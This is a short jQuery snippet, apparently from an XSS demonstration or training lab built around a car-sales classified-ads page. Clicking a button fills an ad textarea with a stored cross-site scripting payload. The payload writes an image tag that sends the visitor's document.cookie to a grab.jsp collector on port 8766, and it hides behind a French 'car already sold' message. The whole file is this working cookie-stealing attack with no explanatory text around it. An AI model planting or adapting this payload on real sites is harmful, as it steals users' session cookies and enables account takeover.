$(function(){
	$("#myxss").click(function(){
		$('#textad').val("<script>document.write('<img class=\"imagexss\" src=\"http://"+window.location.hostname+":8766/grab.jsp?cookie='+document.cookie+'\"/>');</script> Désolée, la voiture a déjà été vendue.")
	});
});
